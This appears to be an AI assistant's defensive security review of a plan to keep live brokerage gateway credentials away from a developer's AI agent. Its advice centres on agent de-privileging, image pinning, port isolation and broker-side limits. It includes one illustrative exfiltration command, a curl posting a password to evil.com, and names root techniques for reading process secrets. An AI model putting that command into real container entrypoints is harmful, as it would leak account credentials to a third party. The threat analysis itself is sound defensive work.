---
source: claude
reviewed: 2026-06-02
context: ib-gateway-cred-protection.md
---

I've read the document. This is a genuinely well-thought-out problem statement — you've already enumerated most of the in-band schemes and correctly tagged them as broken. So I won't waste space re-confirming what you got right. I'll spend it on where the *framing* is off, because that's where the real leverage is.

---

## 1. Assessment

Your security analysis of the individual mechanisms is correct. Your **problem framing has three errors** that make the whole "credential-protection design" exercise partly aim at the wrong target:

**Error A — You're treating `docker` group as the threat. The threat is `sudo`.**
Look at your own point #4. `websurfinmurf` is in `sudo`. `sudo` *is* root. Root can read `/proc/<pid>/environ` of the live gateway, `ptrace`/dump the JVM heap, bind-mount the disk, read any file regardless of mode 600, and tamper with any audit log written to local disk. **Removing him from the `docker` group while he keeps `sudo` is pure theater** — it closes four doors and leaves the vault open. Every "real boundary" you listed has to clear the `sudo` bar, not the `docker` bar, and most of them don't:
- *Rootless docker under admin* → defeated: `sudo -u administrator`, or just `sudo` and read admin's `~/.local/share/docker`. Rootless protects you from *unprivileged* peers; `websurfinmurf` is not unprivileged.
- *VM on this host* → defeated if `websurfinmurf` has host `sudo`: `virsh dump`, qemu monitor, `/dev/mem`. The hypervisor admin can always read guest RAM. A VM is only a boundary if he has **no root on the host running the hypervisor**.
- *TPM/Vault/encrypted-at-rest* → all defeated at runtime by root, as you already noted.

So the honest one-line truth: **on any host where the developer identity can become root, no on-host scheme protects a live secret. Period.** You're 90% of the way to saying this yourself; say it all the way.

**Error B — You're protecting the wrong asset.**
The crown jewel is not `TWS_PASSWORD`. It's the **authenticated, logged-in order-placement capability**. Once the live gateway is up and logged in, anyone who can reach API port 4001 — or `docker exec`/attach the container, or open the VNC — can place real-money orders **without ever seeing a credential**. Your MCP wrapper connects to 4001 precisely this way. If `websurfinmurf` can reach that port (localhost, shared docker network, or via `docker exec`), the entire cred-secrecy program protects nothing — he routes around it. You could encrypt the creds perfectly and still lose the account.

**Error C — The architecture hands live creds to developer-authored code, by design.**
"Dev image is credential-free" is true and irrelevant. At runtime, *admin injects live creds into a container whose entrypoint and layers the developer (or his AI) wrote.* A three-line addition to the entrypoint — `curl -d "$TWS_PASSWORD" evil.com` — exfiltrates on first live start, and no host hardening stops it. **The image is the trust boundary, and receiving the creds at runtime means fully trusting the image.** This is the deepest hole and it's not addressed anywhere in the doc.

---

## 2. What I'd do differently

**Stop asking "how do I make the secret unreadable by uid 1000?" It's both impossible (sudo) and incoherent (he's the account beneficiary — hiding his own trading creds from him means nothing).**

Reframe to the threat you actually stated in your Constraints: *"automated/AI compromise of the developer side, not human attack."* That is **not a file-permission problem. It is an agent-confinement problem.** The thing you're defending against is the **AI agent**, which today runs *as* `websurfinmurf` and therefore inherits his `sudo` + `docker`. **That conflation is the actual vulnerability.** The human and his autonomous agent share one uid with root-equivalence.

The fix is to split those two identities:
- `websurfinmurf` (human) — keeps sudo/docker, is trusted, owns the account.
- `websurfinmurf-agent` (or whatever the AI runs as) — **no sudo, no docker group, no access to 4001, constrained egress.**

Once the agent has its own unprivileged identity, plain `env_file` with mode-600 becomes *adequate*, because the only principals who can read it are humans you already trust. You don't need encryption-at-rest theater, Vault, or TPM. You need the agent to not be root.

---

## 3. Specific suggestions (with rationale)

1. **Give the AI agent its own unprivileged Linux user.** Not in `sudo`, not in `docker`, no access to the docker socket. Rationale: directly closes the only threat you actually named. Everything else is downstream of this. If the agent must run *some* containers (its paper gateway), give it **rootless docker scoped to its own user** — that contains it without granting host root.

2. **Put the live gateway in a trust domain the agent cannot reach.** In order of cleanliness:
   - **Best: separate cheap host/VM where `websurfinmurf` has no account and no host-sudo.** This is the only thing that survives a *fully* compromised dev identity. Repurpose the old machine. The recurring cost is real but small; weigh it against the size of a live brokerage account.
   - **Acceptable: same host, but live gateway runs under admin, on an admin-only docker network, with the agent de-privileged per (1).** This is defensible *only* because the agent no longer has root — not because of any crypto.
   - Reject the "kick him out of docker group for the duration of the live session, restore after" idea outright — it's racy, forgettable, leaves sudo intact anyway, and is operationally fragile. Don't.

3. **Pin the live image by digest and control the entrypoint.** Admin runs `image@sha256:...`, not a floating tag. Ideally admin owns the thin entrypoint/wrapper layer that actually receives the creds, with the dev's gatery image as a base. Rationale: closes Error C — the dev's CI can still iterate freely, but the exact bytes that touch live creds are admin-reviewed and immutable. At minimum, diff the entrypoint before every live promotion.

4. **Lock the live order path, not just the file:**
   - 4001 bound to the admin MCP only (dedicated docker network the agent isn't on, or `127.0.0.1` + admin-only).
   - **VNC disabled in live** except during admin's one-time settings session, and bound to `127.0.0.1` when on. `VNC_SERVER_PASSWORD` in the live env is a standing order-placement backdoor otherwise.
   - Egress-restrict the live container (it only needs IBKR endpoints). A compromised image that *does* get creds then can't phone home.

5. **Use IBKR-side controls as the real backstop** (and treat them as primary, since on-host secrecy is fundamentally limited): API set to require manual approval / trusted-IP allowlist, daily order/size/notional limits, and ideally segregate strategy capital into a sub-account with hard position limits. Rationale: this is the *only* layer that constrains damage even if the host is fully owned. It's also the layer your doc doesn't mention at all.

6. **Audit logging must be off-host and append-only.** Postgres audit on the same box the adversary can root is theater — they read the DB creds and edit the log. Ship to a sink the dev identity can't write/delete (you already run Loki — but Loki on the same host with the same docker access is *also* reachable; send live-relevant security events somewhere the agent cannot reach, even a remote syslog/object-lock bucket).

7. **Drop the "passphrase-typed encrypted file" as a security control.** Keep it, if at all, only as *hygiene* (prevents accidental `git commit` and protects against cold disk/backup theft and reading-while-stopped). It does **nothing** against your stated runtime adversary. Don't let it create a false sense of a boundary.

---

## 4. Risks / gotchas you may be missing

- **The image-as-exfil-vector (Error C)** — biggest one. Reproducibility ("dev iterates without admin on every change") is in direct tension with "admin trusts the bytes that see live creds." You can't have both for free; digest-pinning + entrypoint ownership is the compromise.
- **The authenticated session is the asset (Error B)** — 4001, `docker exec`, attach, and VNC are all order-placement paths that need no credential.
- **`sudo`, not `docker`, is the disqualifier (Error A)** — any plan that removes him from `docker` but leaves `sudo` is theater.
- **VM-on-same-host ≠ isolation if he has host sudo.** Common misconception; the hypervisor admin reads guest RAM.
- **Audit on the rooted host is tamperable.** Off-host or it doesn't count.
- **Shared secret-loading patterns** — make sure `projects/secrets/ib-gateway-live.env` is genuinely outside any repo the dev/CI can read and not swept into a backup the dev can restore. (Your standard location is fine; verify the gitignore and backup ACLs.)
- **2FA is in the session, not the password.** You scoped 2FA out, but note: the value of the password alone is bounded by 2FA *at login* — yet the *running session* is post-2FA, which is exactly why Error B (session = asset) dominates. The session bypasses the control you're deferring.

---

## 5. Blind spots a same-context reviewer would miss

- **The whole document is written from inside the "secret = file" mental model.** A reviewer steeped in the same proposal will keep proposing better *vaults*. The category error is that the secret stops being the secret the moment the gateway logs in — the *session* is the secret, and it lives in a process you can't lock from root. Step outside "protect the file" entirely.
- **"The developer is also the beneficiary" isn't a footnote — it dissolves half the requirement.** A same-context reviewer treats "dev cannot read live creds" as a hard requirement. But hiding a man's own brokerage password from him is incoherent. The *only* coherent version of the requirement is "a runaway **automated agent** acting under his identity cannot exfiltrate creds or place orders." Once you accept that, the answer stops being cryptography and becomes **agent de-privileging + IBKR-side blast-radius limits** — cheaper and actually achievable.
- **You're optimizing confidentiality; the real risk is integrity/availability of the account.** Exfiltrated creds are bad, but they hit a 2FA wall. An agent that places or cancels orders through the *already-authenticated* session does damage with no creds and no 2FA. Re-rank your controls accordingly: order-path isolation + IBKR limits **above** cred secrecy.

---

**Bottom line:** Neither of your two framed options is sufficient. "Encrypted passphrase + postgres audit" is theater against your stated adversary. "Remove from docker + env_file" is *also* insufficient because `sudo` remains and the order-path/image vectors are untouched. The defensible design is: **de-privilege the AI agent (its own non-sudo, non-docker identity) → put live in a domain that identity can't reach (separate host ideal, admin-only rootless on this host acceptable) → pin the image by digest → isolate 4001/VNC → enforce IBKR-side limits and off-host audit.** Then `env_file` mode-600 is genuinely fine, because the only readers left are humans you trust — which was always the real definition of the boundary.

One thing to confirm before you build, because it changes the cost calculus: **does the live trading strategy itself run as the AI agent, or only as admin?** If the live algo *is* the agent, then the agent must reach 4001 by design and the confinement story gets harder — tell me and I'll rework the order-path section around that.
